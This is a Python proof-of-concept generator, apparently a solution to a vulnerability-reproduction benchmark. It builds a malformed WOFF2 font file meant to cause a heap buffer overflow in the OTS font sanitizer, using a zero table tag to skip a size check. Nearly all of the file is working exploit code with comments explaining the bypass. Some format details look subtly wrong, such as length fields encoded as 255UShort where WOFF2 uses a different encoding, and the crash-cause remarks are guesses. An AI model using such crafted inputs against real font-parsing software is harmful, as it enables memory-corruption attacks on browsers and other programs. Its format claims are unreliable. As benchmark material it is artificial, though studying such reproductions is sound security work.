import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap buffer overflow in ots::OTSStream::Write,
        # triggered by a malformed WOFF2 file that bypasses a size check.
        # This is achieved by setting a table tag to 0, which causes the check
        # `(it->first != 0)` to fail, skipping the validation that ensures
        # a table's size fits within the allocated output buffer.
        #
        # PoC structure:
        # 1. WOFF2 Header: Sets `total_sfnt_size` to a very small value (e.g., 1),
        #    which allocates a tiny output buffer. `num_tables` is set to 1.
        # 2. Table Directory: A single entry is crafted with:
        #    - A `tag` of 0 to exploit the faulty check.
        #    - A large `orig_length` to specify an oversized table.
        #
        # This configuration leads the sanitizer to attempt writing a large table
        # into a small buffer, causing a heap overflow in `OTSStream::Write`.
        # The "use-after-free" classification by ASan likely arises from an
        # initial out-of-bounds read from the input buffer when fetching the
        # (non-existent) oversized table data.

        # Total PoC length: Header (48 bytes) + Directory Entry (16 bytes)
        poc_len = 64
        
        # WOFF2 Header (48 bytes, big-endian)
        header = b'wOF2'                               # signature
        header += struct.pack('>I', 0x00010000)         # flavor (TTF)
        header += struct.pack('>I', poc_len)            # length of WOFF2 file
        header += struct.pack('>H', 1)                  # num_tables
        header += struct.pack('>H', 0)                  # reserved
        header += struct.pack('>I', 1)                  # total_sfnt_size (small output buffer)
        header += struct.pack('>I', 0xFFFFFFFF)         # total_compressed_size (to pass another check)
        header += struct.pack('>H', 0)                  # major_version
        header += struct.pack('>H', 1)                  # minor_version
        header += struct.pack('>I', 0) * 5              # meta_offset to priv_length

        # Table Directory Entry (16 bytes, big-endian)
        directory = b''
        
        # flags: 0x1f signals that a 4-byte tag follows
        directory += struct.pack('>B', 0x1f)
        
        # tag: 0 to bypass the size check
        directory += struct.pack('>I', 0)
        
        # This size is derived from the vulnerability report's crash log.
        large_size = 0xFF010233
        
        # orig_length: encoded as a 255UShort (0xFF prefix + 4-byte value)
        directory += struct.pack('>B', 0xff)
        directory += struct.pack('>I', large_size)
        
        # comp_offset: 0, encoded as a 255UShort
        directory += struct.pack('>B', 0)
        
        # comp_length: same large value
        directory += struct.pack('>B', 0xff)
        directory += struct.pack('>I', large_size)
        
        poc = header + directory
        
        return poc